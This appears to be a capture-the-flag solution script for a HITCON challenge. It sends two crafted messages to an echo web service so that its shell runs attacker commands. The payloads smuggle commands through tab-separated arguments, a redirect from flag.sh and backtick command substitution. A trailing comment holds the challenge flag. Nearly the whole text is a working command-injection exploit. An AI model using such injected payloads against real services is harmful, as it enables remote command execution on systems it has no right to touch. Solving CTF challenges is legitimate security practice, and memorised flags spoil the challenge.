cmd = ['/readflag\tgive\tme\tthe\tflag1<flag.sh', '`sh<flag.sh`']
[print(__import__("requests").post("http://eaas.chal.hitconctf.com:30951/echo", data={'msg': cmd[x]}).text) for x in range(2)] # hitcon{i_found_this_bug_during_LINECTF_but_unfortunately_it_became_1day_challenge_a_few_months_ago